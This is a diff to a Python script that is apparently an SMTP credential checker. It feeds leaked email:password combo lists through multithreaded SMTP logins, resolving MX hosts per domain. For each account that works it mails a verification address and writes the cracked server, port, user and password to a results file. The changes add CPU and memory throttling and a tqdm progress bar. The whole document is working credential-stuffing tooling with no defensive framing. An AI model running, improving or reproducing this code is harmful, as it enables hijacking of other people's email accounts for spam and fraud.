@@ -1,4 +1,4 @@
-import socket,threading,base64,datetime,sys,ssl,smtplib,time,re,os,random,signal,queue,subprocess
+import socket,threading,sys,ssl,smtplib,time,re,os,random,signal,queue,subprocess,psutil,tqdm
 from dns import resolver
 from email.mime.text import MIMEText
 
@@ -30,7 +30,7 @@ class c:
 def get_mx_server(domain):
 	global mx_cache, timeout
 	if not domain in mx_cache:
-		for data in resolver.query(domain, 'MX'):
+		for data in resolver.resolve(domain, 'MX'):
 			mx_host = data.exchange.to_text()[0:-1]
 			break
 		for h in [mx_host,domain,'smtp.'+domain,'mail.'+domain,'webmail.'+domain,'mx.'+domain]:
@@ -51,7 +51,7 @@ def get_mx_server(domain):
 	return mx_cache[domain]
 
 def quit(signum, frame):
-	print('\b'*10+f'{c.CYAN}{c.BOLD}Exiting...{c.END}\n')
+	print('\b'*10+f'\n{c.CYAN}{c.BOLD}Exiting...{c.END}\n')
 	sys.exit(0)
 
 def is_valid_email(email):
@@ -72,19 +72,6 @@ def find_email_password_collumnes(list_filename):
 				return (email_collumn, password_collumn)
 	password_collumn = email_collumn+1
 	return (email_collumn, password_collumn)
-
-def print_statuses(thread_name, thread_status):
-	global threads_statuses, threads_count, threads_counter, goods, quee
-	sys.stdout.write('\033[F'*threads_count+'\033[F')
-	threads_statuses[thread_name] = thread_status
-	print((
-		f'[ queue size: {c.BOLD}{quee.qsize()}{c.END} ]'+
-		f'[ cpu load: {c.BOLD}{round(os.getloadavg()[0]/os.cpu_count(),2)}{c.END} ]'+
-		f'[ threads: {c.BOLD}{threads_counter}{c.END} ]'+
-		f'[ goods: {c.BOLD}{c.GREEN}{goods}{c.END} ]'
-	).rjust(144))
-	for i in range(threads_count):
-		print(threads_statuses['thread'+str(i)])
 
 def wc_count(filename):
 	return int(subprocess.check_output(['wc', '-l', filename]).split()[0])
@@ -123,46 +110,67 @@ def smtp_connect_and_send(smtp_server, port, smtp_user, password):
 	server_obj.sendmail(smtp_user, verify_email, headers+message.as_string())
 	server_obj.quit()
 
-def worker_item(quee, results):
-	global threads_counter, verify_email, goods
+def worker_item(jobs_que, results):
+	global threads_counter, verify_email, goods, no_jobs_left
 	self = threading.current_thread()
 	while True:
-		if quee.empty():
-			results.put((self.name,f'queue exhausted, {c.BOLD}sleeping...{c.END}'))
-			time.sleep(3)
-			if quee.empty():
+		if mem_usage>90 or cpu_usage>90:
+			break
+		if jobs_que.empty():
+			if no_jobs_left:
 				break
+			else:
+				results.put(f'queue exhausted, {c.BOLD}sleeping...{c.END}')
+				time.sleep(1)
+				continue
 		else:
-			smtp_server, port, smtp_user, password = quee.get()
-			results.put((self.name,f'{c.WARN}{c.BOLD}trying mx for{c.END} {smtp_user}:{password}'))
+			smtp_server, port, smtp_user, password = jobs_que.get()
+			results.put(f'{c.WARN}{c.BOLD}trying mx for{c.END} {smtp_user}:{password}')
 			if not smtp_server or not port:
 				try:
 					smtp_server, port = get_mx_server(smtp_user.split('@')[1])
 				except Exception as e:
 					continue
-			results.put((self.name,f'{c.BOLD}connecting to{c.END} {smtp_server}|{port}|{smtp_user}|{password}'))
+			results.put(f'{c.BOLD}connecting to{c.END} {smtp_server}|{port}|{smtp_user}|{password}')
 			try:
 				smtp_connect_and_send(smtp_server, port, smtp_user, password)
-				results.put((self.name,f'{c.GREEN}{c.BOLD}{smtp_user}:{password}{c.END} sent to {verify_email}'))
+				results.put(f'{c.GREEN}{c.BOLD}{smtp_user}:{password}{c.END} sent to {verify_email}')
 				open(smtp_filename, 'a').write(f"{smtp_server}|{port}|{smtp_user}|{password}\n")
 				goods += 1
 				time.sleep(1)
 			except Exception as e:
 				e = str(e).strip()[0:100]
-				results.put((self.name,f'{smtp_server}:{port} - {c.FAIL}{c.BOLD}{e}{c.END}'))
+				results.put(f'{smtp_server}:{port} - {c.FAIL}{c.BOLD}{e}{c.END}')
 				open(errors_filename, 'a').write(f"{smtp_server}|{port}|{smtp_user}|{password} - {e}\n")
 	threads_counter -= 1
 
+def every_second():
+	global mem_usage, cpu_usage, jobs_que, results, threads_counter
+	time.sleep(3)
+	while True:
+		if no_jobs_left:
+			break
+		mem_usage = psutil.virtual_memory()[2]
+		cpu_usage = max(psutil.cpu_percent(percpu=True))
+		if mem_usage<80 and cpu_usage<80:
+			threading.Thread(target=worker_item, args=(jobs_que,results), daemon=True).start()
+			threads_counter += 1
+		time.sleep(1)
+
 signal.signal(signal.SIGINT, quit)
-quee = queue.Queue()
+jobs_que = queue.Queue()
 results = queue.Queue()
 goods = 0
+mem_usage = 0
+cpu_usage = 0
 threads_count = 50
 threads_counter = 0
 threads_statuses = {}
 mx_cache = {}
 timeout = 3
 threads_started = False
+no_jobs_left = False
+
 try:
 	list_filename = sys.argv[1]
 	smtp_filename = sys.argv[1].split('.')
@@ -172,8 +180,14 @@ try:
 	verify_email = sys.argv[2]
 	if not is_valid_email(verify_email):
 		raise
-	exclude_mail_hosts = sys.argv[3] or 'sorry,mom'
-	start_from_line = sys.argv[4] or 0
+	try:
+		exclude_mail_hosts = sys.argv[3]
+	except:
+		exclude_mail_hosts = 'sorry,mom'
+	try:
+		start_from_line = sys.argv[4]
+	except:
+		start_from_line = 0
 except:
 	exit(f'usage: \npython3 {sys.argv[0]} list.txt verify_email@example.com [exclude,mail,hosts] [start_from_line]')
 email_collumn, password_collumn = find_email_password_collumnes(list_filename)
@@ -181,36 +195,42 @@ total_lines = wc_count(list_filename)
 print(f'total lines to procceed: {c.BOLD}{str(total_lines)}{c.END}')
 print(f'email coll: {c.BOLD}{str(email_collumn)}{c.END}, password coll: {c.BOLD}{str(password_collumn)}{c.END}')
 print(f'verification email: {c.BOLD}{verify_email}{c.END}')
-sys.stdout.write('\n'*threads_count)
-with alive_bar(total_lines, bar='blocks', title='Progress:') as progress_bar, open(list_filename) as fp:
+with tqdm.tqdm(total=total_lines,smoothing=0.5,initial=start_from_line) as progress_bar, open(list_filename) as fp:
 	for i in range(int(start_from_line)):
 		line = fp.readline()
-		progress_bar()
 	while True:
-		while quee.qsize()<threads_count*2:
+		while jobs_que.qsize()<threads_count*2:
 			line = fp.readline().strip()
-			if not line:
+			if not line and line!='':
+				no_jobs_left = True
 				break
 			if line.count('|')==3:
-				quee.put((line.split('|')))
+				jobs_que.put((line.split('|')))
 			else:
 				line = re.sub('[;,\t| \'"]+', ':', line)
 				fields = line.split(':')
 				if len(fields)>1 and is_valid_email(fields[email_collumn]) and len(fields[password_collumn])>7 and not is_ignored_host(fields[email_collumn]):
-					quee.put((False,False,fields[email_collumn],fields[password_collumn]))
+					jobs_que.put((False,False,fields[email_collumn],fields[password_collumn]))
 				else:
-					progress_bar()
+					progress_bar.update(1)
 		if not results.empty():
-			thread_name, thread_status = results.get()
-			print_statuses(thread_name, '\b'*10+thread_status)
+			thread_status = results.get()
+			tqdm.tqdm.write(thread_status)
 			if 'trying' in thread_status:
-				progress_bar()
-		if threads_counter == 0 and quee.empty():
+				progress_bar.set_postfix(
+					mem = f'{c.BOLD}{mem_usage}{c.END}%',
+					cpu = f'{c.BOLD}{cpu_usage}{c.END}%',
+					threads = f'{c.BOLD}{threads_counter}{c.END}',
+					goods = f'{c.BOLD}{c.GREEN}{goods}{c.END}'
+				)
+				progress_bar.update(1)
+		if threads_counter == 0 and jobs_que.empty():
+			progress_bar.close()
 			print('\b'*10+f'{c.GREEN}{c.BOLD}All done.{c.END}')
 			break
 		if not threads_started:
+			threading.Thread(target=every_second, daemon=True).start()
 			while threads_counter < threads_count:
-				threading.Thread(name='thread'+str(threads_counter), target=worker_item, args=(quee,results), daemon=True).start()
-				threads_statuses['thread'+str(threads_counter)] = 'no data'
+				threading.Thread(target=worker_item, args=(jobs_que,results), daemon=True).start()
 				threads_counter += 1
 			threads_started = True
